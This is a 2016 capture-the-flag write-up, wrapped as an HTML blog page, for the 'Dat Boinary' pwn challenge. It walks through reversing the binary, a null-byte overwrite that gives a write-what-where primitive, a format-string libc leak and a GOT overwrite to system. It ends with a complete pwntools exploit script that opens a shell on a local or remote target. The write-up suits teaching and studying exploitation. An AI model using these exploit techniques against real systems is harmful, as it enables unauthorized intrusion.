@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<title>
+  Grazfather - CTF(x) - Binary 250 - Dat Boinary 
+</title>
+
+<meta name="generator" content="Hugo 0.73.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://grazfather.github.io/css/main.css">
+<link rel="stylesheet" href="https://grazfather.github.io/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="en-US">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">CTF(x) - Binary 250 - Dat Boinary</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON AUG 28, 2016 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/ctf">CTF</a>, 
+      
+      <a class="meta" href="/categories/pwn">PWN</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    <nav id="TableOfContents"></nav>
+    
+    <p>For this challenge we&rsquo;re provided the binary and a <em>libc.so.6</em> binary. Just by being provided this second binary we are hinted that we will need some fuctionality from it: Rop or ret2libc probably.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>grazfather ~/code/CTFs/ctfx<span style="color:#f92672">]</span>$ file dat-boinary
+dat-boinary: ELF 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked <span style="color:#f92672">(</span>uses shared libs<span style="color:#f92672">)</span>, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, not stripped</code></pre></div>
+<p>I&rsquo;ve recently bought the personal edition of <a href="http://binary.ninja">Binary Ninja</a>, and so will be using it for most of my static analysis.</p>
+<p>Popping it into binja we (happily) see that it&rsquo;s a rather small binary. <code>main</code> is rather simple, with a menu system and a large loop, and what looks like no exit.</p>
+<p><img src="/assets/2016-08-28-CTFx-Dat-Boinary-main.png" alt="main"></p>
+<p>First a buffer of 0x80 bytes is allocated and its pointer stored at $ebp - 0x14 (<em>buf_ptr</em>). We&rsquo;re prompted for an ID, which is at most 9 bytes (including the null) and stored locally, at $ebp - 0x20 (<em>ID</em>).</p>
+<p>Next the menu is printed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">What would you like to <span style="color:#66d9ef">do</span>?
+1<span style="color:#f92672">)</span> upd4te th3 1d of y0ur meme.
+2<span style="color:#f92672">)</span> Updat3 the d4nkn3ss of your m3m3.
+3<span style="color:#f92672">)</span> upd4te the c0ntent of your maymay.
+4<span style="color:#f92672">)</span> pR1nT th3 c0nT3nT of ur memey.
+5<span style="color:#f92672">)</span> s00p3r s3cr3t meme 0pt10n.</code></pre></div>
+<p>Reversing item by item we see the following:</p>
+<ol>
+<li><code>strlen(ID)</code> is called and its lenght is provided to <code>fread</code> (instead of <code>fgets</code> like the first time).</li>
+<li><code>read_number</code> is called, and its return value is stored at ebp - 0x10 (<em>dankness</em>), it&rsquo;s compared to 0x80, the size of the allocated buffer, and if greater or equal, or signed, the nothing happens. If the value is in range, however, the &lsquo;dankness&rsquo; is copied to ebp - 0x18.</li>
+<li>The value at ebp - 0x18 (<em>size</em>) is checked to be valid. If in range, <code>fgets</code> is called to write to <em>buf_ptr</em>.</li>
+<li>Simply calls <code>printf(&quot;%s&quot;, buf_ptr);</code>.</li>
+<li><code>secret_meme(ID)</code> is called. This function is not too short, but the only interesting part is right at the start:
+<img src="/assets/2016-08-28-CTFx-Dat-Boinary-secret_meme.png" alt="secret_meme">
+It writes 0x69696969 to <code>(buf + 8)</code>. Since this function is passed the address of the ID in <code>main</code>'s stack frame (0x20), this will write to main&rsquo;s local at ebp - 0x18, which is <em>size</em>, which used to determine how much to write into the heap buf.</li>
+</ol>
+<p>With these functions figured out, this is what main&rsquo;s stack frame looked like:
+<img src="/assets/2016-08-28-CTFx-Dat-Boinary-stack_frame.png" alt="main&rsquo;s locals"></p>
+<p>While using <code>secret_meme</code> might look like a good way to get a huge write into the heap buffer, that is not actually where the vulnerability lies. The size is checked that it&rsquo;s in range, anyway. Instead, this function helps us because it can wipe out <em>ID</em>&rsquo;s null byte: Provided an eight-byte ID the null byte will lie over the first byte of <em>size</em>. By overwriting this we can change our ID, and the <code>strlen</code> call will not return 8 (or less) but instead <code>8 + sizeof(size) + sizefof(buf_ptr)</code>, and will keep going until it finds a null byte. What is important, though, is that this will allow us to overwrite <em>buf_ptr</em>, and then we can use menu option 3 to write <em>at</em> this selected address.</p>
+<p>To write to this address, though, I needed to pass the size check, but <code>secret_meme</code> had placed an invalid value, and anyway I had overwritten it again on my way to overwriting <em>buf_size</em>. I could have used the second menu item to reset the size, but I instead just made sure to write a valid size when I was overwriting these bytes.</p>
+<p>With a write-what-where primitive I can pretty much do what I want, but I don&rsquo;t know the address of the stack, so I will have to attack the <em>global offset table</em>. Here I made it more difficult than I needed, but bear with me.</p>
+<p>I know that I needed to leak the address of something in libc, so that I could calculated the offset from there to <code>system</code>, and then patch that address into some import&rsquo;s entry in the GOT. My idea was to replace <code>atoi@got</code>, which is used in the menu, with the address of <code>printf@plt</code>. This would allow me to provide format strings to the menu system to leak addresses on the stack. An added benefit is that I could still use the menu, because <code>printf</code> returns the number of bytes printed, so to select item 3, for example, it&rsquo;d just have to pass a string that prints three bytes.</p>
+<p>One interesting thing I noticed about Binary Ninja is that they seem to name some of their symbols incorrectly. When finding the address of <code>atoi@got</code>, I got myself pretty confused. What binja labels as <code>atoi</code> is <em>actually</em> <code>atoi@plt</code>. What they label as <code>atoi@plt</code> is <code>atoi@got.plt</code>.</p>
+<p><img src="/assets/2016-08-28-CTFx-Dat-Boinary-atoi_plt_binja.png" alt="leaking libc">
+According to Binary Ninja
+<img src="/assets/2016-08-28-CTFx-Dat-Boinary-atoi_plt_gdb.png" alt="leaking libc">
+According to GDB.</p>
+<p>Inspecting the stack I could see that <code>__libc_start_main+243</code> is on the stack, and would be the 23rd element printed. This means that provided the string &ldquo;%23$X&rdquo; would print out that address.</p>
+<p><img src="/assets/2016-08-28-CTFx-Dat-Boinary-leak_libc.png" alt="leaking libc"></p>
+<p>Now reading this address and using binja to find the address of <code>__libc_start_main</code> and <code>system</code> I could calculate the offset. I could use this offset and the leaked run-time address to find the address of <code>system</code> in memory.</p>
+<p>With the address of <code>system</code> on hand, I had to write to the <code>atoi@got</code> entry again, replacing <code>printf@plt</code> with <code>system</code>. This was done simply by passing a string of length three bytes (including the newline) to <code>printf</code> to select menu item 3.</p>
+<p>Finally, with the pointer in place, I simply needed to enter shell command I wanted into the menu system.</p>
+<p>Now while this worked fine, I noticed later that I had made it more complicated than I needed to: Menu item 4 would print out the value at <code>buf_addr</code>, and when I filled it with the address of <code>atoi@got</code>, that value woudl be the address of <code>atoi</code> (since it had already been called and so already resolved). This would get me my libc address leak without needing a format string.</p>
+<p>Either way, I had a working exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   $ id
+   uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dat_boinary<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dat_boinary<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dat_boinary<span style="color:#f92672">)</span>
+   $ ls
+   dat_boinary
+   flag.txt
+   $ cat flag.txt
+   ctf<span style="color:#f92672">(</span>0n1y_th3_fr35h35t_m3m3s<span style="color:#f92672">)</span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+system_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3e3e0</span>
+libc_start_main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x19970</span>
+libc_leak_addr <span style="color:#f92672">=</span> libc_start_main_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">243</span>
+system_offset <span style="color:#f92672">=</span> system_addr <span style="color:#f92672">-</span> libc_leak_addr
+
+atoi_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8049128</span>
+printf_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8048410</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(r):
+    <span style="color:#75715e"># Set the id to something 8 chars long</span>
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;please give your meme an id&#34;</span>)
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+
+    <span style="color:#75715e"># Run secret to overwrite the nullbyte</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;5&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">secret&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+
+    <span style="color:#75715e"># Update the id, but make sure that bytes 8-11 (dankness) are undex 0x80</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;3nt3r ur m3m3 id&#34;</span>)
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#f92672">+</span> p32(atoi_got))
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#75715e"># fread will read until it gets 21 bytes</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+
+    <span style="color:#75715e"># Now we can write anything to that address</span>
+    <span style="color:#75715e"># -- Write printf</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(p32(printf_plt))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+
+    <span style="color:#75715e"># Now in the menu we can enter format strings</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;%23$X&#34;</span>) <span style="color:#75715e"># The address of __libc_csu_init</span>
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0pt10n.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">==&gt; &#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0pt10n.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">==&gt; &#34;</span>)
+    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+    leak <span style="color:#f92672">=</span> int(leak, <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Got leak 0x{:X}&#34;</span><span style="color:#f92672">.</span>format(leak))
+    system_addr <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> system_offset
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;System shoud be at 0x{:X}&#34;</span><span style="color:#f92672">.</span>format(system_addr))
+
+    <span style="color:#75715e"># Update meme (atoi_got) to point to system</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;33&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(p32(system_addr))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;==&gt;&#34;</span>)
+
+    <span style="color:#75715e"># Now call system with &#34;/bin/sh&#34;</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+    r<span style="color:#f92672">.</span>interactive()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;For remote: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> HOST PORT&#34;</span> <span style="color:#f92672">%</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>])
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        r <span style="color:#f92672">=</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+        exploit(r)
+    <span style="color:#66d9ef">else</span>:
+        r <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./dat-boinary&#39;</span>], env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>:<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>})
+        <span style="color:#66d9ef">print</span> util<span style="color:#f92672">.</span>proc<span style="color:#f92672">.</span>pidof(r)
+        pause()
+        exploit(r)</code></pre></div>
+<p>flag: ctf(0n1y_th3_fr35h35t_m3m3s)</p>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-06-01-reading-april-may-2016/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/posts">posts</a></span>
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-09-01-reading-june-august-2016/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://grazfather.github.io">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright"></h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
